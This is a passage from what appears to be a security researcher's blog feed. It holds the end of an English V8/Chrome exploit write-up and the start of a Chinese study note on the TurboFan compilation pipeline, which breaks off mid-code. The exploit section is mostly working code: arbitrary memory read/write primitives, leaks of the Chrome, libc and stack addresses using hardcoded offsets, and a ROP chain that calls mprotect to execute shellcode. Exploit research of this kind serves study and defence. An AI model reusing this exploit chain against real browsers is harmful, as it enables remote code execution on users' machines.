class="number">1</span>n).i2f();</span><br><span class="line">  g4[<span class="number">0</span>] = val.i2f();</span><br><span class="line">  g2[ab_off+<span class="number">2</span>] = old;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>Let’s have a look on <code>readq</code></p><p>We can get the original value of <code>backing store</code> form <code>g2[ab_off+2]</code>. Change it to the target address. Pay attention to the last <code>1</code>. This is a mechanism called <code>Tagged Value</code>. Only when 1 is in the last of the address can it be a valid pointer of <code>HeapObject</code>.</p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-11-14-113544.png" alt=""></p><p>Edit it to the content we want to read. E.g, leak the code:<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-11-14-120746.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-11-14-120730.png" alt=""></p><p>I explained why we should <code>- 20</code> previously, so skip this part here:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">g2[ab_backing_store_off<span class="number">-2</span>] = (addr<span class="number">-0x20</span>n|<span class="number">1</span>n).i2f();</span><br></pre></td></tr></table></figure></p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-11-14-121339.png" alt=""></p><p>Now the <code>backing store</code> is changed to <code>addr-0x20</code><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-11-14-121639.png" alt=""></p><p>We can leak code address <code>0x000001db14a8c821</code> from <code>0x0000093f11611288</code> now.</p><p>Output:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> Array_addr = leak_ptr(<span class="built_in">Array</span>);</span><br><span class="line">print(<span class="string">'Array_addr: '</span> + Array_addr.hex());</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> Array_code_addr = readq(Array_addr + <span class="number">6</span>n*<span class="number">8</span>n);</span><br><span class="line">print(<span class="string">'Array_code_addr: '</span> + Array_code_addr.hex());</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">Array_code_addr: <span class="number">0x1db14a8c821</span></span><br></pre></td></tr></table></figure></p><p><code>writeq</code> is the same as <code>readq</code>.</p><h3 id="Security-Feature"><a href="#Security-Feature" class="headerlink" title="Security Feature"></a>Security Feature</h3><p>Earlier than <code>version 6.7</code>, the function code is writable. Therefore, we can write shellcode to functions and call the function to execute.</p><p>Later, however, the code is not writable and we need to chain ROP.(<a href="https://github.com/v8/v8/commit/f7aa8ea00bbf200e9050a22ec84fab4f323849a7" target="_blank" rel="noopener">https://github.com/v8/v8/commit/f7aa8ea00bbf200e9050a22ec84fab4f323849a7</a>)</p><h3 id="leak-ArrayConstructor"><a href="#leak-ArrayConstructor" class="headerlink" title="leak ArrayConstructor"></a>leak ArrayConstructor</h3><p>Now, leak the address of <code>Array</code>, Then find the address of Array’s code. In the final, calculate the address of ArrayConstructor:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> Array_addr = leak_ptr(<span class="built_in">Array</span>);</span><br><span class="line">print(<span class="string">'Array_addr: '</span> + Array_addr.hex());</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> Array_code_addr = readq(Array_addr + <span class="number">6</span>n*<span class="number">8</span>n);</span><br><span class="line">print(<span class="string">'Array_code_addr: '</span> + Array_code_addr.hex());</span><br><span class="line"><span class="comment">// Builtins_ArrayConstructor</span></span><br><span class="line"><span class="keyword">let</span> builtin_val = readq(Array_code_addr+<span class="number">8</span>n*<span class="number">8</span>n);</span><br><span class="line"><span class="keyword">let</span> Array_builtin_addr = builtin_val &gt;&gt; <span class="number">16</span>n;</span><br><span class="line">print(<span class="string">'Array_builtin_addr: '</span> + Array_builtin_addr.hex());</span><br></pre></td></tr></table></figure></p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-11-14-122341.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-11-14-122454.png" alt=""></p><h3 id="Reverse-Chrome-and-libc"><a href="#Reverse-Chrome-and-libc" class="headerlink" title="Reverse Chrome and libc"></a>Reverse Chrome and libc</h3><p>We can leak the address of <code>ArrayConstructor</code><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-11-16-085233.jpg" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-11-16-085258.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-11-16-085307.jpg" alt=""></p><p>It’s mapped to the memory of chrome binary.<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-11-16-085402.png" alt=""></p><p>Use IDA to reverse. Seek the offset of <code>ArrayConstructor</code> in chrome binary.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; hex(0x55b677f727c0-0x55b673f16000)</span><br><span class="line">&apos;0x405c7c0&apos;</span><br></pre></td></tr></table></figure></p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-11-16-085706.png" alt=""></p><p><code>chrome binary base address</code>=<code>ArrayConstructor</code>-<code>0x405c7c0</code>. Let’s store the result in <code>bin_base</code>：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> bin_base = Array_builtin_addr - <span class="number">0x405c7c0</span>n;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">`bin base: <span class="subst">$&#123;bin_base.hex()&#125;</span>`</span>);</span><br></pre></td></tr></table></figure></p><p>Find <code>got table</code>. <code>cxa_finalize</code> is a libc function，there is a <code>got</code> in chrome pointing to it, the offset to the pointer is <code>0x8DDBDE8</code>.</p><p>Then leak <code>cxa_finalize</code>:<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-11-16-085836.png" alt=""></p><p>Reverse the libc.so, use <code>cxa_finalize_got</code>-<code>0x43520</code> to get the <code>base address</code> of libc:<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-11-16-090345.png" alt=""><br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> cxa_finalize_got = bin_base + <span class="number">0x8ddbde8</span>n;</span><br><span class="line"><span class="keyword">let</span> libc_base = readq(cxa_finalize_got) - <span class="number">0x43520</span>n;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'libc base: '</span> + libc_base.hex());</span><br></pre></td></tr></table></figure></p><p>Find <code>environ</code> to leak stack address:<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-11-16-090537.png" alt=""><br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> environ = libc_base+<span class="number">0x3ee098</span>n;</span><br><span class="line"><span class="keyword">let</span> stack_ptr = readq(environ);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">`stack: <span class="subst">$&#123;stack_ptr.hex()&#125;</span>`</span>);</span><br></pre></td></tr></table></figure></p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-11-16-090700.jpg" alt=""></p><h3 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h3><p>This section is easy, we use <code>mprotect</code> to change the permission of memory and execute shellcode:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">let</span> nop = bin_base+<span class="number">0x263d061</span>n;</span><br><span class="line">  <span class="keyword">let</span> pop_rdi = bin_base+<span class="number">0x264bdcc</span>n;</span><br><span class="line">  <span class="keyword">let</span> pop_rsi = bin_base+<span class="number">0x267e82e</span>n;</span><br><span class="line">  <span class="keyword">let</span> pop_rdx = bin_base+<span class="number">0x26a8d66</span>n;</span><br><span class="line">  <span class="keyword">let</span> mprotect = bin_base+<span class="number">0x88278f0</span>n;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> sc_array = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(<span class="number">2048</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; sc.length; i++) &#123;</span><br><span class="line">    sc_array[i] = sc[i];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">let</span> sc_addr = readq((leak_ptr(sc_array)<span class="number">-1</span>n+<span class="number">0x68</span>n));</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">`sc_addr: <span class="subst">$&#123;sc_addr.hex()&#125;</span>`</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> rop = [</span><br><span class="line">    pop_rdi,</span><br><span class="line">    sc_addr,</span><br><span class="line">    pop_rsi,</span><br><span class="line">    <span class="number">4096</span>n,</span><br><span class="line">    pop_rdx,</span><br><span class="line">    <span class="number">7</span>n,</span><br><span class="line">    mprotect,</span><br><span class="line">    sc_addr</span><br><span class="line">  ];</span><br><span class="line">  <span class="keyword">let</span> rop_start = stack_ptr - <span class="number">8</span>n*BigInt(rop.length);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; rop.length; i++) &#123;</span><br><span class="line">    writeq(rop_start+<span class="number">8</span>n*BigInt(i), rop[i]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x200</span>; i++) &#123;</span><br><span class="line">    rop_start -= <span class="number">8</span>n;</span><br><span class="line">    writeq(rop_start, nop);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>The addresses in red rectangle is environment variable, and the contents in yellow rectangle are <code>0x200*retn</code>, <strong>variable <code>nop</code> here represents <code>retn</code> instruction but not 0x90</strong>(<code>nop</code> instruction), we the code executes <code>retn</code>，it will keep returning until executing our ROP。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x200</span>; i++) &#123;</span><br><span class="line">  rop_start -= <span class="number">8</span>n;</span><br><span class="line">  writeq(rop_start, nop);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-11-16-090853.png" alt=""></p><h3 id="Exploit-1"><a href="#Exploit-1" class="headerlink" title="Exploit"></a>Exploit</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd ~/chrome</span><br><span class="line">./chrome index.html</span><br></pre></td></tr></table></figure><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-11-16-091400.jpg" alt=""></p><h2 id="Other"><a href="#Other" class="headerlink" title="Other"></a>Other</h2><h3 id="Acknowledgement"><a href="#Acknowledgement" class="headerlink" title="Acknowledgement"></a>Acknowledgement</h3><p>I would acknowledge stephen(@_tsuro) who guides me and points out my stupid mistakes.<br>Debugging d8 is quite different from chrome，when leaking cxa，it will map builtin to a random address，and cxa is mapped to libv8.so，so we cannot find offset via cxa.<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-11-16-091930.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-11-16-091917.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-11-16-091900.png" alt=""><br>When you complete a arbitrary r/w primitive in v8，you can exploit chrome via the script without additional debug（yes, u don’t need to debug a full chrome)</p><p>Thanks Auxy(@realAuxy233) for translating~<br>If you find any errors or corrections, contact me. </p>]]></content>
      
      <categories>
          
          <category> 浏览器 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> v8 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>v8 pipeline</title>
      <link href="/2018/09/05/pipeline/"/>
      <url>/2018/09/05/pipeline/</url>
      <content type="html"><![CDATA[<h2 id="总览"><a href="#总览" class="headerlink" title="总览"></a>总览</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">v8::internal::GeneratedCode</span><br><span class="line">    -&gt; RUNTIME_FUNCTION(Runtime_CompileOptimized_NotConcurrent)</span><br><span class="line">        -&gt; Compiler::CompileOptimized</span><br><span class="line">            -&gt; GetOptimizedCode</span><br><span class="line">                -&gt; GetOptimizedCodeNow</span><br><span class="line">                    -&gt; OptimizedCompilationJob::PrepareJob</span><br><span class="line">                        -&gt; PipelineCompilationJob::Status PipelineCompilationJob::PrepareJobImpl</span><br><span class="line">                            -&gt; PipelineImpl::CreateGraph()</span><br><span class="line">                                -&gt; BytecodeGraphBuilder::CreateGraph()</span><br><span class="line">                                ...</span><br><span class="line">                                  -&gt; SetStart</span><br><span class="line">                                    -&gt; NewNodeUnchecked</span><br><span class="line">                                      -&gt; Node::New</span><br><span class="line">                                ...</span><br><span class="line">                                  -&gt; env</span><br><span class="line">                                  -&gt; VisitBytecodes</span><br></pre></td></tr></table></figure><h3 id="Compiler-CompileOptimized-function-ConcurrencyMode-kNotConcurrent"><a href="#Compiler-CompileOptimized-function-ConcurrencyMode-kNotConcurrent" class="headerlink" title="Compiler::CompileOptimized(function, ConcurrencyMode::kNotConcurrent)"></a>Compiler::CompileOptimized(function, ConcurrencyMode::kNotConcurrent)</h3><p>参数1是要compile的function，参数2是一个标志,应该是和线程相关，表示function不在“正在编译的函数的队列”里。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">if (mode == ConcurrencyMode::kConcurrent) &#123;</span><br><span class="line">  if (GetOptimizedCodeLater(job.get(), isolate)) &#123;</span><br><span class="line">    job.release();  // The background recompile job owns this now.</span><br><span class="line"></span><br><span class="line">    // Set the optimization marker and return a code object which checks it.</span><br><span class="line">    function-&gt;SetOptimizationMarker(OptimizationMarker::kInOptimizationQueue);</span><br><span class="line">    DCHECK(function-&gt;IsInterpreted() ||</span><br><span class="line">           (!function-&gt;is_compiled() &amp;&amp; function-&gt;shared()-&gt;IsInterpreted()));</span><br><span class="line">    DCHECK(function-&gt;shared()-&gt;HasBytecodeArray());</span><br><span class="line">    return BUILTIN_CODE(isolate, InterpreterEntryTrampoline);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></p><p>在这个函数中进行编译，这个函数首先检查function是否已经被编译过了。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if (function-&gt;IsOptimized()) return true;</span><br></pre></td></tr></table></figure></p><p>然后进行编译优化，如果编译优化成功则以后在js中调用函数都执行编译后的code<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if (!GetOptimizedCode(function, mode).ToHandle(&amp;code)) &#123;</span><br><span class="line">    ...</span><br><span class="line">// Install code on closure.</span><br><span class="line">function-&gt;set_code(*code);</span><br></pre></td></tr></table></figure></p><p>如果失败，则回到解释帧InterpreterEntryTrampoline执行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code = BUILTIN_CODE(isolate, InterpreterEntryTrampoline);</span><br></pre></td></tr></table></figure></p><h3 id="bool-GetOptimizedCodeNow-OptimizedCompilationJob-job-Isolate-isolate"><a href="#bool-GetOptimizedCodeNow-OptimizedCompilationJob-job-Isolate-isolate" class="headerlink" title="bool GetOptimizedCodeNow(OptimizedCompilationJob job, Isolate isolate)"></a>bool GetOptimizedCodeNow(OptimizedCompilationJob<em> job, Isolate</em> isolate)</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (job-&gt;PrepareJob(isolate) != CompilationJob::SUCCEEDED ||</span><br><span class="line">    job-&gt;ExecuteJob() != CompilationJob::SUCCEEDED ||</span><br><span class="line">    job-&gt;FinalizeJob(isolate) != CompilationJob::SUCCEEDED) &#123;</span><br></pre></td></tr></table></figure><h3 id="CompilationJob-Status-OptimizedCompilationJob-PrepareJob"><a href="#CompilationJob-Status-OptimizedCompilationJob-PrepareJob" class="headerlink" title="CompilationJob::Status OptimizedCompilationJob::PrepareJob"></a>CompilationJob::Status OptimizedCompilationJob::PrepareJob</h3><p>v8里有非常多的status，很有意思。<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">DEFINE_BOOL(trace_opt, <span class="literal">false</span>, <span class="string">"trace lazy optimization"</span>)</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line"><span class="keyword">if</span> (FLAG_trace_opt &amp;&amp; compilation_info()-&gt;IsOptimizing()) &#123;</span><br><span class="line">    <span class="function">OFStream <span class="title">os</span><span class="params">(<span class="built_in">stdout</span>)</span></span>;</span><br><span class="line">    os &lt;&lt; <span class="string">"[compiling method "</span> &lt;&lt; Brief(*compilation_info()-&gt;closure())</span><br><span class="line">       &lt;&lt; <span class="string">" using "</span> &lt;&lt; compiler_name_;</span><br><span class="line">    <span class="keyword">if</span> (compilation_info()-&gt;is_osr()) os &lt;&lt; <span class="string">" OSR"</span>;</span><br><span class="line">    os &lt;&lt; <span class="string">"]"</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></p><p>这个函数就是调用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return UpdateState(PrepareJobImpl(isolate), State::kReadyToExecute);</span><br></pre></td></tr></table></figure></p><h3 id="PipelineCompilationJob-Status-PipelineCompilationJob-PrepareJobImpl"><a href="#PipelineCompilationJob-Status-PipelineCompilationJob-PrepareJobImpl" class="headerlink" title="PipelineCompilationJob::Status PipelineCompilationJob::PrepareJobImpl"></a>PipelineCompilationJob::Status PipelineCompilationJob::PrepareJobImpl</h3><p>前面根据一些标志位进行设置，包括下面这些等。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">// OptimizedCompilationInfo encapsulates the information needed to compile</span><br><span class="line">// optimized code for a given function, and the results of the optimized</span><br><span class="line">// compilation.</span><br><span class="line">class V8_EXPORT_PRIVATE OptimizedCompilationInfo final &#123;</span><br><span class="line"> public:</span><br><span class="line">  // Various configuration flags for a compilation, as well as some properties</span><br><span class="line">  // of the compiled code produced by a compilation.</span><br><span class="line">  enum Flag &#123;</span><br><span class="line">    kAccessorInliningEnabled = 1 &lt;&lt; 0,</span><br><span class="line">    kFunctionContextSpecializing = 1 &lt;&lt; 1,</span><br><span class="line">    kInliningEnabled = 1 &lt;&lt; 2,</span><br><span class="line">    kDisableFutureOptimization = 1 &lt;&lt; 3,</span><br><span class="line">    kSplittingEnabled = 1 &lt;&lt; 4,</span><br><span class="line">    kSourcePositionsEnabled = 1 &lt;&lt; 5,</span><br><span class="line">    kBailoutOnUninitialized = 1 &lt;&lt; 6,</span><br><span class="line">    kLoopPeelingEnabled = 1 &lt;&lt; 7,</span><br><span class="line">    kUntrustedCodeMitigations = 1 &lt;&lt; 8,</span><br><span class="line">    kSwitchJumpTableEnabled = 1 &lt;&lt; 9,</span><br><span class="line">    kCalledWithCodeStartRegister = 1 &lt;&lt; 10,</span><br><span class="line">    kPoisonRegisterArguments = 1 &lt;&lt; 11,</span><br><span class="line">    kAllocationFoldingEnabled = 1 &lt;&lt; 12,</span><br><span class="line">    kAnalyzeEnvironmentLiveness = 1 &lt;&lt; 13,</span><br><span class="line">    kTraceTurboJson = 1 &lt;&lt; 14,</span><br><span class="line">    kTraceTurboGraph = 1 &lt;&lt; 15,</span><br><span class="line">    kTraceTurboScheduled = 1 &lt;&lt; 16,</span><br><span class="line">  &#125;;</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">FLAG_always_opt</span><br><span class="line">FLAG_turbo_loop_peeling</span><br><span class="line">FLAG_turbo_inlining</span><br><span class="line">FLAG_inline_accessors</span><br><span class="line">FLAG_turbo_allocation_folding</span><br></pre></td></tr></table></figure></p><p>然后开始创建Graph<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!pipeline_.CreateGraph()) &#123;</span><br><span class="line">  <span class="keyword">if</span> (isolate-&gt;has_pending_exception()) <span class="keyword">return</span> FAILED;  <span class="comment">// Stack overflowed.</span></span><br><span class="line">  <span class="keyword">return</span> AbortOptimization(BailoutReason::kGraphBuildingFailed);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="PipelineImpl-CreateGraph"><a href="#PipelineImpl-CreateGraph" class="headerlink" title="PipelineImpl::CreateGraph()"></a>PipelineImpl::CreateGraph()</h3><p>检查trace标志位并做相应操作,主要是做记录。<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (info()-&gt;trace_turbo_json_enabled() ||</span><br><span class="line">    info()-&gt;trace_turbo_graph_enabled()) &#123;</span><br></pre></td></tr></table></figure></p><p>通过添加修饰器来记录源码位置。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data-&gt;source_positions()-&gt;AddDecorator();</span><br></pre></td></tr></table></figure></p><p>然后<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">  Run&lt;GraphBuilderPhase&gt;();</span><br><span class="line">  RunPrintAndVerify(<span class="string">"Initial untyped"</span>, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Perform function context specialization and inlining (if enabled).</span></span><br><span class="line">  Run&lt;InliningPhase&gt;();</span><br><span class="line">  RunPrintAndVerify(<span class="string">"Inlined"</span>, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Remove dead-&gt;live edges from the graph.</span></span><br><span class="line">  Run&lt;EarlyGraphTrimmingPhase&gt;();</span><br><span class="line">  RunPrintAndVerify(<span class="string">"Early trimmed"</span>, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Run the type-sensitive lowerings and optimizations on the graph.</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">// Determine the Typer operation flags.</span></span><br><span class="line">    Typer::Flags flags = Typer::kNoFlags;</span><br><span class="line">    <span class="keyword">if</span> (is_sloppy(info()-&gt;shared_info()-&gt;language_mode()) &amp;&amp;</span><br><span class="line">        info()-&gt;shared_info()-&gt;IsUserJavaScript()) &#123;</span><br><span class="line">      <span class="comment">// Sloppy mode functions always have an Object for this.</span></span><br><span class="line">      flags |= Typer::kThisIsReceiver;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (IsClassConstructor(info()-&gt;shared_info()-&gt;kind())) &#123;</span><br><span class="line">      <span class="comment">// Class constructors cannot be [[Call]]ed.</span></span><br><span class="line">      flags |= Typer::kNewTargetIsReceiver;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Type the graph and keep the Typer running on newly created nodes within</span></span><br><span class="line">    <span class="comment">// this scope; the Typer is automatically unlinked from the Graph once we</span></span><br><span class="line">    <span class="comment">// leave this scope below.</span></span><br><span class="line">    Typer typer(isolate(), flags, data-&gt;graph());</span><br><span class="line">    Run&lt;TyperPhase&gt;(&amp;typer);</span><br><span class="line">    RunPrintAndVerify(<span class="string">"Typed"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Lower JSOperators where we can determine types.</span></span><br><span class="line">    Run&lt;TypedLoweringPhase&gt;();</span><br><span class="line">    RunPrintAndVerify(<span class="string">"Lowered typed"</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Do some hacky things to prepare for the optimization phase.</span></span><br><span class="line">  <span class="comment">// (caching handles, etc.).</span></span><br><span class="line">  Run&lt;ConcurrentOptimizationPrepPhase&gt;();</span><br><span class="line"></span><br><span class="line">  data-&gt;EndPhaseKind();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="BytecodeGraphBuilder-CreateGraph"><a href="#BytecodeGraphBuilder-CreateGraph" class="headerlink" title="BytecodeGraphBuilder::CreateGraph()"></a>BytecodeGraphBuilder::CreateGraph()</h3><p>设置图的基本结构。<br>{Start}的输出是形参（包括receiver）加上new target, arguments数目,context和closure<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> actual_parameter_count = bytecode_array()-&gt;parameter_count() + <span class="number">4</span>;</span><br><span class="line">graph()-&gt;SetStart(graph()-&gt;NewNode(common()-&gt;Start(actual_parameter_count)));</span><br></pre></td></tr></table></figure></p><p>NewNode是用于创建新node的帮助函数。<br>common()返回CommonOperatorBuilder*的common_,差不多是一个op的集合了，然后从中选择Start<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 